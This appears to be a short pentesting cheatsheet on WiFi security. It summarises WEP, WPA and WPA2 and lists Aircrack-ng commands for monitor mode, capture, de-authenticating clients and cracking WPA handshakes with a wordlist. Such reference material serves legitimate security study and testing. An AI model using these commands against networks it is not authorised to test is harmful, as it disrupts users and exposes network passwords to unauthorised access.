---
layout: page
title:  "Wifi hacking"
permalink: "pentesting-wifi.html"
tags: [security, pentesting]
summary: "A cheatsheet for WIFI hacking. For the description of the protocols, have a look at the networking section."
---


## WIFI encryption schemes
* WEP: was the original encryption scheme for wireless. Quickly discovered to be
  flawed. Used RC4, but because of the small key size (24-bit), repeated the IV
  about every 5,000 packets enabling easy cracking on a busy network using
  statistical attacks
* WPA: quick fix for the flaws of WEP, adding a larger key and TKIP to make it
  slightly more difficult to crack
* WPA2-PSK: uses a pre-shared key (PSK) and AES. Then salts the hashes with the
  SSID. Hash exchanged at authentication in a four-way handshake
* WPA2-Enterprise: most secure. Uses a 128-bit key, AES, and a remote
 authentication server (RADIUS)


## Aircrack-ng
* Monitor mode: equivalent of promiscuous mode in wired network cards but for WiFI
* Start monitor mode: `airmon-ng start $DEV`
* Capture data: `airodump-ng`
* De-authenticate clients: `aireplay-ng -0 1 -a $BSSID $DEV`
* Crack WPA: `aircrack-ng -a2 -b $BSSID -w wordlist.txt file-with-handshake.cap`


## Resources and references
* [Krack attack on WPA2 detection](https://github.com/vanhoefm/krackattacks-scripts)
* [WPA3 flaw](https://amp.thehackernews.com/thn/2019/04/wpa3-hack-wifi-password.html?__twitter_impression=true)
